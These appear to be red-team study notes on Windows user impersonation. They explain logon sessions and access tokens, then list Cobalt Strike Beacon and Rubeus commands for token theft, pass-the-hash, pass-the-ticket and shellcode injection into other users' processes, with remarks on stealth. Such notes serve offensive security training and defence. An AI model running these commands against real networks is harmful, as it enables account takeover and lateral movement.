Once an adversary has obtained credentials such as plaintext passwords, hashes, or Kerberos tickets, they need to use that credential to assume the identity of the user to whom they belong.

Logon Sessions hold information like:
	unique Logon Identifier (LUID)
	username Security Identifier (SID)
	authentication package to authenticate user
	logon time
	logon server (DC)
	DNS domain name & User Principal Name (UPN)

Access Tokens contain security info associated with logon session:
	unique Token ID
	ID of the parent logon session (Authentication ID)
	token type (primary or impersonation)
	user's SID
	SIDs of domain groups user is a member of
	list of privileges
	token integrity level (low, medium, high, system)

Every process that starts within a logon session will be assigned a primary access token

Accessing Network Resources
	To access a network resource, Windows uses the information in its access token to lookup the associated logon session and its associated credential cache, then authenticates![[Pasted image 20251226160538.png]]
## Token Impersonation
_Token Impersonation_ is a technique where an adversary impersonates an access token belonging to another user.

Requirements:
	User Credentials
	or
	Steal from processes funning in other logon sessions

```powershell
## Make token with user credentials          
beacon> make_token [DOMAIN\user] [Password]

## Steal a token from a running process. See NOTE
# REQUIRES HIGH-INTEGRITY
beacon> ps                 # identify processes and associated user 
	process_browser        # alternative
beacon> steal_token [PID]  # Steal token (consider token-store instead)

## Revert beacon / stop impersonating a token
beacon> rev2self

## User token-store to manage tokens
beacon> token-store steal [PID]       # steal token and add to store
beacon> token-store show              # print tokens in store
beacon> token-store use [ID]          # use a token in store
beacon> token-store remove [ID]       # remove token from store 
```
NOTE: Stealing tokens you need to be careful to not drop impersonation and close the process.
	Token-store solves this by permanently holding a reference to the token
## Pass the Hash
_Pass the Hash_ (often shortened to PtH) is a technique that allows adversaries to leverage an NTLM hash for user impersonation.  See [[Methodology/User Impersonation/Pass the Hash (PtH)|Pass the Hash (PtH)]]. Note: NTLM is slowly becoming legacy.

Beacon has a built-in `pth` command
```powershell
beacon> pth [DOMAIN\user] [hash]
```
## Pass the Ticket
_Pass the Ticket_ (or PtT) allows an adversary to leverage stolen, forged, or requested Kerberos tickets for user impersonation. PtT > PtH. More stealthy. See [[Pass the Ticket (PtT)]]

```powershell
## Requesting TGTs
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:[user] /domain:[DOMAIN] /aes256:[AES key] /nowrap # NTLM (RC4) can be used instead of aes256, but bad OPSEC...

## Injecting TGTs into Session (2 methods)
1. # kerberos_ticket_use -- Beacon native, requires .kirbi file, TGT only
$ticket = "[base64 encoded kerberos ticket]"
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\[user].kirbi", [Convert]::FromBase64String($ticket))            # Write ticket to .disk
beacon> run klist                                # identify LUID
beacon> make_token [DOMAIN]\[victim] FakePass    # create NEW logon session
beacon> run klist                                # verify LUID has changed
beacon> kerberos_ticket_use C:\path\[user].kirbi # inject ticket into session
beacon> run klist                                # check cached ticket

beacon> kerberos_ticket_purge   # purge ticket but keep session
beacon> rev2self                # revert to original session

2. # Rubeus -- Inject TGT AND service tickets, and accepts base64 & .kirbi
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\notepad.exe /username:[victim] /domain:[domain] /password:FakePass              # spawn hidden process w/new logon session. make_token Alternative. Make note of LUID and PID
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /luid:[luid] /ticket:[base64 ticket]  # Inject ticket into process
beacon> token-store steal [PID] # Steal token of spawned process. See NOTES.
beacon> token-store use 0

beacon> rev2self                # drop impersonation when done
beacon> kill [PID]              # kill process
```
NOTES:
	Injecting TGTs
		We created a new logon session so we don't overwrite any existing tickets
		kerberus_ticket_use has more limitations vs Rubeus
			can only inject TGTs, not service tickets
			only accepts .kirbi files
	Why does steal_token show the first user and not the victim we spawned the process as?
		steal_token AND getuid is taken from PRIMARY ACCESS TOKEN
		does not matter if we pass other creds into it.

## Process Injection
A crude technique for impersonating a user, is to inject Beacon shellcode directly into a process they are running.

NOTE: requires high-integrity session.

```powershell
# snoop on processes
beacon> [ps | process_browser]      # make note of PIDs and Users

# Inject shellcode (2 ways)
1. beacon> inject [PID] x64 http    # example of injecting x64 http beacon 
2. click inject > tcp-local listener
```
